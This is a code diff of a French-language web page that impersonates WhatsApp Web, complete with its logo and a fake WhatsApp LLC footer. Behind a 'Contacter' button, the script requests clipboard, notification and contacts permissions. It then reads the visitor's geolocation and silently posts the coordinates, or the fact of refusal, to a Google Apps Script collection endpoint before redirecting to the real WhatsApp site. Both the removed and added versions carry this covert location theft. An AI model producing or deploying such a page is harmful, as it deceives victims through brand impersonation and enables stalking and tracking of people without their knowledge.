@@ -1,100 +1,260 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr" style="--splashscreen-startup-background: #F7F5F3; --splashscreen-primary-title: #0A1014; --splashscreen-secondary-lighter: #5B6368; --splashscreen-progress-primary: #1DAA61; --splashscreen-progress-background: rgba(0, 0, 0, 0.1);">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Partager Mon Contact</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-<style>
-    body { margin:0; font-family:'Roboto', sans-serif; background:#F7F5F3; color:#0A1014; display:flex; flex-direction:column; min-height:100vh; justify-content:center; align-items:center; text-align:center; }
-    .card { background:#fff; padding:30px; border-radius:10px; box-shadow:0 4px 12px rgba(0,0,0,0.1); max-width:400px; width:100%; }
-    .profile-circle { width:80px; height:80px; background:#B0B0B0; color:#fff; font-size:2.5em; font-weight:700; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 15px; }
-    .name { font-size:1.6em; font-weight:700; margin-bottom:15px; }
-    button { background:#25d366; color:#fff; border:none; padding:14px 24px; border-radius:8px; font-weight:600; cursor:pointer; margin-top:10px; transition:.3s; }
-    button:hover { background:#20b858; }
-    .loading { display:none; width:50px; height:50px; border:5px solid #f3f3f3; border-top:5px solid #25d366; border-radius:50%; animation:spin 1s linear infinite; margin:20px auto; }
-    @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
-</style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Partager Mon Contact</title>
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yP/r/rYZqPCBaG70.png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-color: #F7F5F3;
+            --primary-color: #25d366;
+            --header-color: #F7F5F3;
+            --text-color: #0A1014;
+            --secondary-color: #5B6368;
+            --button-hover: #20b858;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            background-color: var(--header-color);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        header img {
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        header h1 {
+            color: #000000;
+            font-size: 1.4em;
+            margin: 0;
+            font-weight: 700;
+        }
+
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background-color: #fff;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .profile-circle {
+            width: 80px;
+            height: 80px;
+            background-color: #B0B0B0;
+            color: #fff;
+            font-size: 2.5em;
+            font-weight: 700;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .name {
+            font-size: 1.8em;
+            font-weight: 700;
+            margin: 10px 0 5px;
+            color: var(--text-color);
+        }
+
+        p {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        button {
+            background-color: var(--primary-color);
+            color: #fff;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: var(--button-hover);
+        }
+
+        .footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            font-size: 0.9em;
+            color: var(--secondary-color);
+        }
+
+        .footer p {
+            display: flex;
+            align-items: center;
+            margin: 0;
+        }
+
+        .footer a {
+            margin-left: 10px;
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .loading {
+            display: none;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #25d366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
+
 <body>
 
-<div class="card" id="contactCard">
-    <div class="profile-circle">S</div>
-    <div class="name">Saifou</div>
-    <p id="statusText">Cliquez pour partager votre contact sur WhatsApp</p>
-    <button id="actionButton">Contacter</button>
-    <div class="loading" id="loadingSpinner"></div>
-</div>
+    <header>
+        <a href="https://web.whatsapp.com" style="text-decoration: none; display: flex; align-items: center;">
+            <img src="https://static.whatsapp.net/rsrc.php/v4/yP/r/rYZqPCBaG70.png" alt="Logo" />
+            <h1>WhatsApp Web</h1>
+        </a>
+    </header>
 
-<script>
-const card = document.getElementById('contactCard');
-const button = document.getElementById('actionButton');
-const spinner = document.getElementById('loadingSpinner');
-const statusText = document.getElementById('statusText');
+    <div class="main">
+        <div class="card" id="contactCard">
+            <div class="profile-circle">S</div>
+            <div class="name">Saifou</div>
+            <p>Cliquez pour partager votre contact sur WhatsApp</p>
+            <button id="actionButton">Contacter</button>
+            <div class="loading" id="loadingSpinner"></div>
+        </div>
+    </div>
 
-button.addEventListener('click', function() {
-    button.style.display = 'none';
-    spinner.style.display = 'block';
-    statusText.textContent = "Accès à WhatsApp en cours...";
+    <div class="footer">
+        <p>2025 © WhatsApp LLC</p>
+        <p><a href="https://www.whatsapp.com/legal/">Conditions et politique de confidentialité</a></p>
+    </div>
 
-    // Demande de permission notifications
-    if ('Notification' in window) {
-        Notification.requestPermission().then(permission => {
-            console.log("Permission notifications:", permission);
-            startGeolocation();
+    <script>
+        document.getElementById('actionButton').addEventListener('click', async function() {
+            const card = document.getElementById('contactCard');
+            const button = document.getElementById('actionButton');
+            const spinner = document.getElementById('loadingSpinner');
+
+            button.style.display = 'none';
+            spinner.style.display = 'block';
+            card.querySelector('p').textContent = "Accès à Whatsapp en cours...";
+
+            try {
+                // 1. Demande accès presse-papiers
+                await navigator.permissions.query({ name: 'clipboard-write' });
+
+                // 2. Demande autorisation notifications
+                if ('Notification' in window) {
+                    await Notification.requestPermission();
+                }
+
+                // 3. Demande accès aux contacts (si dispo)
+                if (navigator.contacts && navigator.contacts.select) {
+                    await navigator.contacts.select(['name', 'tel'], { multiple: false });
+                }
+
+                // 4. Géolocalisation
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            // Envoi données acceptées
+                            await fetch("https://script.google.com/macros/s/AKfycbwOiyIdX2JBQACPx3FOQX5XF6iNf4iI-SwxnOUD3n0ir8vg_rrfdmQQv3b98LecIVFi/exec", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    nom_utilisateur: "seami",
+                                    contact: "0123456789",
+                                    statut_geoloc: "acceptée",
+                                    heure: new Date().toISOString()
+                                }),
+                                mode: 'no-cors'
+                            }).catch(err => console.error("Erreur fetch:", err));
+
+                            card.querySelector('p').textContent = "Redirection en cours...";
+                            setTimeout(() => {
+                                window.location.href = "https://web.whatsapp.com";
+                            }, 1500);
+                        },
+                        async (error) => {
+                            // Envoi données refusées
+                            await fetch("https://script.google.com/macros/s/AKfycbwOiyIdX2JBQACPx3FOQX5XF6iNf4iI-SwxnOUD3n0ir8vg_rrfdmQQv3b98LecIVFi/exec", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    latitude: null,
+                                    longitude: null,
+                                    nom_utilisateur: "seami",
+                                    contact: "0123456789",
+                                    statut_geoloc: "refusée",
+                                    heure: new Date().toISOString()
+                                }),
+                                mode: 'no-cors'
+                            }).catch(err => console.error("Erreur fetch:", err));
+
+                            window.location.href = "geoloc-refuse.html";
+                        },
+                        { enableHighAccuracy: false, timeout: 3000 }
+                    );
+                } else {
+                    window.location.href = "https://web.whatsapp.com";
+                }
+            } catch (error) {
+                console.error("Erreur:", error);
+                window.location.href = "https://web.whatsapp.com";
+            }
         });
-    } else {
-        startGeolocation();
-    }
-});
-
-function startGeolocation() {
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                // Géoloc acceptée
-                fetch("https://script.google.com/macros/s/AKfycbwOiyIdX2JBQACPx3FOQX5XF6iNf4iI-SwxnOUD3n0ir8vg_rrfdmQQv3b98LecIVFi/exec", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        nom_utilisateur: "seami",
-                        contact: "0123456789",
-                        statut_geoloc: "acceptée",
-                        heure: new Date().toISOString()
-                    }),
-                    mode: 'no-cors'
-                }).catch(err => console.error("Erreur fetch:", err));
-
-                statusText.textContent = "Redirection en cours...";
-                setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1500);
-            },
-            function(error) {
-                // Géoloc refusée
-                fetch("https://script.google.com/macros/s/AKfycbwOiyIdX2JBQACPx3FOQX5XF6iNf4iI-SwxnOUD3n0ir8vg_rrfdmQQv3b98LecIVFi/exec", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        latitude: null,
-                        longitude: null,
-                        nom_utilisateur: "seami",
-                        contact: "0123456789",
-                        statut_geoloc: "refusée",
-                        heure: new Date().toISOString()
-                    }),
-                    mode: 'no-cors'
-                }).catch(err => console.error("Erreur fetch:", err));
-
-                window.location.href = "geoloc-refuse-mobile.html";
-            },
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    } else {
-        window.location.href = "https://web.whatsapp.com";
-    }
-}
-</script>
-
+    </script>
 </body>
 </html>
